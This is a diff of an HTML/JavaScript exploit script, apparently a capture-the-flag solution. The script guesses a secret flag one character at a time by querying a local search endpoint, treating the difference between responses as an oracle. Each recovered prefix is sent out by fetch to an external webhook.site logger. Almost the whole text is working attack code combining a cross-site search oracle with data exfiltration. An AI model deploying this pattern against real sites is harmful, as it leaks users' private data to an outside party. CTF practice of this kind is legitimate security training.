@@ -1,25 +1,18 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
 const TARGET = "http://127.0.0.1/search?q=";
 const LOGGER = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
 const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
 
-// kirim progress ke webhook
 function log(msg) {
   fetch(LOGGER + "?d=" + encodeURIComponent(msg)).catch(()=>{});
 }
 
-// cek apakah prefix menghasilkan hasil
 async function check(prefix) {
   try {
     const res = await fetch(TARGET + encodeURIComponent(prefix));
     const text = await res.text();
-
-    // ini kunci: beda response
-    return !text.includes("No visible PDF matched");
-  } catch (e) {
+    return text.includes("<iframe"); // ✅ ini fix penting
+  } catch {
     return false;
   }
 }
@@ -29,9 +22,7 @@ async function solve(prefix) {
 
   for (const c of ALPHABET) {
     const attempt = prefix + c;
-    const ok = await check(attempt);
-
-    if (ok) {
+    if (await check(attempt)) {
       log("found: " + attempt);
 
       if (c === '}') {
@@ -39,14 +30,10 @@ async function solve(prefix) {
         return;
       }
 
-      await solve(attempt);
-      return;
+      return solve(attempt);
     }
   }
 }
 
-// mulai dari prefix flag
 solve("CBD{");
 </script>
-</body>
-</html>
